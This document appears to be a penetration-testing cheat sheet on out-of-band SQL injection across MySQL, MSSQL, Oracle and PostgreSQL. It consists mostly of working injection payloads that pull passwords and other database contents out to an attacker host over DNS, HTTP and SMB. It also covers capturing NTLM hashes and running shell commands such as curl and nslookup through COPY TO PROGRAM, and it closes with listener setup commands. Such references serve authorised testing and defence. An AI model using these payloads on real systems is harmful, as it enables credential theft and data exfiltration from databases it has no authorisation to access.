# Out-of-Band (OOB) SQL Injection

## Overview

OOB SQLi exfiltrates data through external network channels (DNS, HTTP). Used when:
- No in-band response (async processing)
- Blind techniques too slow
- Network egress available (DNS often allowed)

Requires: Burp Collaborator, interactsh, or custom DNS/HTTP server.

## DNS Exfiltration

### MySQL (Windows Only)

```sql
-- Basic DNS lookup
' AND LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\a'))--

-- Extract data via DNS
' AND LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 0,1),'.attacker.com\\a'))--

-- INTO OUTFILE method
' UNION SELECT 1,2,3 INTO OUTFILE '\\\\attacker.com\\share\\output.txt'--
```

### MSSQL

```sql
-- xp_dirtree (most common)
'; EXEC master..xp_dirtree '\\attacker.com\share'--

-- With data exfiltration
'; DECLARE @d VARCHAR(1024); SET @d=(SELECT TOP 1 password FROM users); EXEC('master..xp_dirtree "\\'+@d+'.attacker.com\a"')--

-- xp_fileexist
'; EXEC master..xp_fileexist '\\attacker.com\a'--

-- xp_subdirs
'; EXEC master..xp_subdirs '\\attacker.com\a'--
```

Full data extraction:
```sql
'; DECLARE @p VARCHAR(1024);
SET @p=(SELECT password FROM users WHERE username='admin');
EXEC('master..xp_dirtree "\\'+@p+'.attacker.com\a"')--
```

### Oracle

#### XXE-based (Unpatched)

```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://attacker.com/'||(SELECT user FROM dual)||'"> %remote;]>'),'/l') FROM dual--
```

#### UTL_HTTP (Requires Privileges)

```sql
' AND UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) IS NOT NULL--

' AND UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE ROWNUM=1)) IS NOT NULL--
```

#### UTL_INADDR

```sql
' AND UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.attacker.com') IS NOT NULL--

' AND UTL_INADDR.GET_HOST_NAME((SELECT password FROM users WHERE ROWNUM=1)||'.attacker.com') IS NOT NULL--
```

#### HTTPURITYPE

```sql
' AND (SELECT HTTPURITYPE('http://attacker.com/'||(SELECT user FROM dual)).GETCLOB() FROM dual) IS NOT NULL--
```

### PostgreSQL

#### COPY TO PROGRAM

```sql
'; COPY (SELECT '') TO PROGRAM 'nslookup '||(SELECT current_database())||'.attacker.com'--

'; CREATE TABLE mydata(t text); COPY mydata FROM PROGRAM 'nslookup '||(SELECT current_database())||'.attacker.com'--
```

#### dblink Extension

```sql
'; SELECT * FROM dblink('host=attacker.com user=a password='||(SELECT password FROM users LIMIT 1)||' dbname=a','SELECT 1') RETURNS (i int)--
```

## HTTP Exfiltration

### MySQL

```sql
-- Not directly supported, use UDF or INTO OUTFILE
' UNION SELECT 1,2,3 INTO OUTFILE '/var/www/html/data.txt'--
```

### MSSQL

#### OLE Automation

```sql
'; DECLARE @o INT;
EXEC sp_OACreate 'MSXML2.ServerXMLHTTP', @o OUT;
EXEC sp_OAMethod @o, 'open', NULL, 'GET', 'http://attacker.com/?data='+(SELECT password FROM users), 'false';
EXEC sp_OAMethod @o, 'send';--
```

### Oracle

```sql
' AND UTL_HTTP.REQUEST('http://attacker.com/?d='||(SELECT password FROM users WHERE ROWNUM=1))--
```

### PostgreSQL

```sql
'; COPY (SELECT password FROM users) TO PROGRAM 'curl http://attacker.com/?d=$(cat)'--
```

## SMB Relay Attacks

### MySQL

```sql
-- Trigger SMB connection (captures NTLM hash)
SELECT LOAD_FILE('\\\\attacker.com\\share\\file');
SELECT 'data' INTO DUMPFILE '\\\\attacker.com\\share\\out';
LOAD DATA INFILE '\\\\attacker.com\\share\\file' INTO TABLE mytable;
```

### MSSQL

```sql
-- Capture NTLM credentials
EXEC master..xp_dirtree '\\attacker.com\share';
EXEC master..xp_fileexist '\\attacker.com\share\file';
```

## Burp Collaborator Payloads

Replace `BURP-COLLABORATOR-SUBDOMAIN` with your Collaborator URL.

### MySQL
```sql
' AND LOAD_FILE(CONCAT('\\\\',database(),'.BURP-COLLABORATOR-SUBDOMAIN\\a'))--
```

### MSSQL
```sql
'; EXEC master..xp_dirtree '\\BURP-COLLABORATOR-SUBDOMAIN\a'--
```

### Oracle
```sql
' AND UTL_HTTP.REQUEST('http://BURP-COLLABORATOR-SUBDOMAIN/'||(SELECT user FROM dual)) IS NOT NULL--
```

### PostgreSQL
```sql
'; COPY (SELECT '') TO PROGRAM 'nslookup BURP-COLLABORATOR-SUBDOMAIN'--
```

## Data Encoding for DNS

DNS labels limited to 63 chars, total 253 chars. Encode data:

```sql
-- Hex encoding
'; DECLARE @h VARCHAR(1024); SET @h=CONVERT(VARCHAR(1024),(SELECT password FROM users),2); EXEC('master..xp_dirtree "\\'+@h+'.attacker.com\a"')--

-- Base64 (may need chunking)
-- Split long data into multiple DNS requests
```

## Requirements and Limitations

| DBMS | Function | Requirement |
|------|----------|-------------|
| MySQL | LOAD_FILE | FILE privilege, Windows only for UNC |
| MSSQL | xp_dirtree | Enabled by default |
| MSSQL | xp_cmdshell | Disabled by default, requires sysadmin |
| Oracle | UTL_HTTP | ACL permissions required (11g+) |
| Oracle | UTL_INADDR | ACL permissions required (11g+) |
| PostgreSQL | COPY TO PROGRAM | Superuser only |

## Setup Listener

### Using Burp Collaborator
1. Burp Suite Pro > Collaborator client
2. Copy payload URL
3. Poll for interactions

### Using interactsh
```bash
interactsh-client
```

### Custom DNS Server
```bash
# Using tcpdump
tcpdump -i eth0 udp port 53

# Using dnschef  
dnschef --fakeip 127.0.0.1 -i attacker.com
```

### Custom HTTP Server
```bash
python -m http.server 80
nc -lvp 80
```
